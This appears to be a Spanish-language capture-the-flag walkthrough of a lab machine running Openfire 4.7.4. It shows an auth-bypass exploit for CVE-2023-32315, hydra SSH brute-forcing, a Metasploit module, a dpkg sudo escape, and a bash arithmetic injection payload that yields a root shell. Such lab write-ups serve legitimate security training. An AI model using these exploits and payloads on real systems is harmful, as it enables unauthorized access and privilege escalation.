22/tcp   open  ssh
5222/tcp open  xmpp-client
5223/tcp open  hpvirtgrp
5269/tcp open  xmpp-server
5270/tcp open  xmp
7070/tcp open  realserver
7777/tcp open  cbt
9090/tcp open  zeus-admin

-Hacemos un escaneo exaustivo con nmap y encontramos un panel de login en el puerto 9090:
	9090/tcp open  zeus-admin?

-Vamos a 172.17.0.2:9090 y encontramos el panel de login bajo el servicio 'Openfire' version 4.7.4

-2 opciones de ganar acceso:
	1-Manual 
		-Buscamos exploits para 'Openfire version 4.7.4' y encontramos el siguiente repositorio:
			https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT
		-Nos lo descargamos y lo ejecutamos:
			-python3 CVE-2023-32315.py -u http://172.17.0.2:9090
				[+] Target is vulnerable
				[*] Adding credentials
				[+] Successfully added, here are the credentials
				[+] Username: hugme
				[+] Password: HugmeNOW
		-Nos dice que la web es vulnerable y que ha creado un usuario para que nos podemos autenticar en el panel.
		-Nos autenticamos con las credenciales y obtenemos acceso al dasboard de Openfire
		-Vamos al apartado de 'Users/Groups' y encontramos el usuario 'chocolatitochingon'
		-Aplicamos fuerza fuerza con hydra para averiguar su contraseña de ssh:
			-hydra ssh://172.17.0.2 -l chocolatitochingon -P /usr/share/wordlists/rockyou.txt 
				-User: chocolatitochingon -Password: chocolate
		-Nos autenticamos por ssh con las credenciales obtenidas
		-Estamos dentro:
			chocolatitochingon@3b79b0374e18:~$
	2-Automática
	-Abrimos metasploit y buscamos posibles exploits para el servicio 'Openfire'
		-search openfire --> Encontramos el siguiente: 
			msf6 exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) >
		-Especificamos el lhost y el rhosts y obtenemos una shell como root:
			root@3b79b0374e18:~#

## Escalada de Privilegios

-Somos el usuario 'chocolatitochingon', vamos a ver que comandos como sudo podemos ejecutar:
	sudo -l:
		(pinguinacio) NOPASSWD: /usr/bin/dpkg
-Podemos ejecutar el binario /usr/bin/dpkg bajo los permisos del usuario 'pinguinacio' sin necesidad de aportar contraseña.

-Buscamos como explotar el binario en Gtfobins y pivotamos al usuario 'pinguinacio':
	-sudo -u pinguinacio dpkg -l
	-!/bin/sh
	pinguinacio@3b79b0374e18:/home$
-Vemos que comandos podemos ejecutar como root con el usuario 'pinguinacio':
	(ALL) NOPASSWD: /bin/bash /home/pinguinacio/script.sh
	-Tenemos acceso al siguiente script que es propiedad de root, vemos su contenido:
		#!/bin/bash
		read -rp "Ingrese el número 1 para hacer un backup de tus archivos: " numero
		if [ [ "$numero" -eq 1] ]
		then
		    echo "El número ingresado es igual a 1"
		    echo "Intentando copiar archivos al directorio /opt..."
		    cp * /opt
		    echo "Copia completada."
		else
		    echo "El número ingresado no es igual a 1. No se realizará ninguna operación."

-Aquí intente hacer un PATH HIJACKING abusando de 'cp' SIN exito, también intenté crear un archivo malicioso y ejecutarlo desde /opt pero se ejecutaba con los privilegios de mi usuario, no con los de root.

-Finalmente, la manera de escalar a root mediante este script es abusando de esta sintaxis de bash:
	[ [ "$numero" -eq 1] ]

-Buscamos 'bash eq Privilege Escalation' y encontramos el siguiente recurso:
	https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/bash-eq-privilege-escalation/

-Se trata de una vulnerabilidad del lenguaje bash que ocurre cuando tenemos la siguiente sintaxis en un script. 
	[ [eq] ]

-Como podemos ejecutar el script con privilegos de root, podemos ejecutar comandos como root abusando de la vulnerabilidad 'bash eq privilege escalation':
	-Ejecutamos el script como root:
		-sudo /bin/bash /home/pinguinacio/script.sh 
		-Ingrese el número 1 para hacer un backup de tus archivos: 
			-bash a[$(/bin/sh >&2)]+1
			root@3b79b0374e18:/home#

